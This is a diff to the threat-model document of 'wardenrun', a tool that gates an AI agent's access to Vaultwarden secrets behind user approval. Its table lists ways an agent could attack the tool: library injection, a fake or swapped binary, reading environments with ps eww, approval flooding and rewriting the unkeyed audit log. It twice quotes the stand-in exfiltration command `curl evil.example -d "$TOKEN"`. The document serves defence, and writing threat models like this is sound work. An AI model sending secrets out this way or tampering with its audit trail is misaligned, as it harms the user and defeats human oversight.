@@ -62,10 +62,10 @@ collection is exposed, never your personal vault.
 | 5 | The agent injects code into wardenrun (`DYLD_INSERT_LIBRARIES`, a debugger) | Blocked | Hardened runtime ignores `DYLD_INSERT_LIBRARIES` (tested), debugger attach is denied, and wardenrun refuses to start if `DYLD_*` is set. |
 | 6 | The agent tricks wardenrun into running a fake `bw` (changed `PATH`, `NODE_OPTIONS`, edited config) to capture the master password | Blocked | `bw` is called by an absolute path whose identity is stored inside the protected keychain item. Its environment is built from an allowlist. On the preferred path and on the pipe-based fallback, the master password is never in `bw`'s environment or command line (the last-resort fallback is row 16). |
 | 7 | The agent replaces or aliases the `wardenrun` binary | **Not protected** | Install directories are writable by you, so the agent can too. A fake prompt can then phish a touch. `wardenrun doctor` (planned) is meant to check the signature and the install path, and the certificate hash will be published with the first release, but nothing forces you to look. |
-| 8 | You approve a command that prints or sends the secret (`curl evil.example -d "$TOKEN"`, a script that logs it) | **Not protected** | This is why the sheet shows the whole command. Masking catches accidents (raw, base64, URL-encoded, hex, JSON-escaped, shell-quoted), not intent: reversing or splitting the value beats it. |
+| 8 | You approve a command that prints or sends the secret (`curl evil.example -d "$TOKEN"`, a script that logs it) | **Not protected** | This is why the sheet shows the whole command. Masking catches accidents (raw, base64, URL-encoded, hex, JSON-escaped, shell-quoted), not intent: reversing or splitting the value beats it. The sheet shows the command but not the environment the agent set, so it also tags risky variables (`NODE_OPTIONS`, `BASH_ENV`, `LD_PRELOAD`), and a program file you can write (`[writable exe]`), which could be swapped between the final check and the start. |
 | 9 | While an approved command runs, the agent reads its environment with `ps eww` | **Not protected** for `--env` injection | Tested: ordinary programs leak their environment to the same user (Apple's own binaries do not). Use `--stdin` for tools that can read the secret from standard input. The temporary-file mode is readable by you while the file exists. |
 | 10 | The agent floods you with prompts hoping for a careless yes | Mitigated | One pending prompt, a cool-down after refusals, every refusal in the audit log. |
-| 11 | The agent edits the audit log | Detectable, not preventable | Each line carries the hash of the previous one. You can still delete the whole file. |
+| 11 | The agent edits the audit log | **Not protected** against a determined edit | Each line carries the hash of the previous one, which catches accidents and clumsy edits. The hash has no key, so a process of yours that knows the format can rewrite lines, drop the last ones or delete the file. |
 | 12 | The agent reads the master password from wardenrun's memory | Mitigated | Memory is locked and zeroed after use, core dumps are off, debugger attach is denied. |
 | 13 | The stored master password leaks | Damage limited | It belongs to a dedicated account that sees one collection (see above). |
 | 14 | Someone impersonates your Vaultwarden server | Mitigated | `https://` is required (plain `http://` is refused by `bw`, even on loopback: tested) and `bw` verifies certificates. |
@@ -82,7 +82,11 @@ not oversights.
 - **A swapped wardenrun binary** (row 7). If something replaces the program you think you are
   running, its prompt looks real. Verify the install ([`README.md`](../README.md#verify-dont-trust)).
 - **A command you approved** (row 8). wardenrun shows you the command; it cannot tell whether
-  the command is safe. If you approve `curl evil.example -d "$TOKEN"`, the secret leaves.
+  the command is safe. If you approve `curl evil.example -d "$TOKEN"`, the secret leaves. The
+  same goes for a script you can edit: it is hashed and re-checked just before it starts, but a
+  process of yours that can write it could change it in the last instant.
+- **The audit log** (row 11). Anything running as you can rewrite or cut it. Treat it as a
+  convenience record, not as evidence.
 - **Secrets in a program's environment** (row 9). While the program runs, other processes of
   your user can read its environment. Prefer `--stdin`.
 - **`bw`'s own secrets on the fallback paths** (row 16), and **its login tokens on disk**
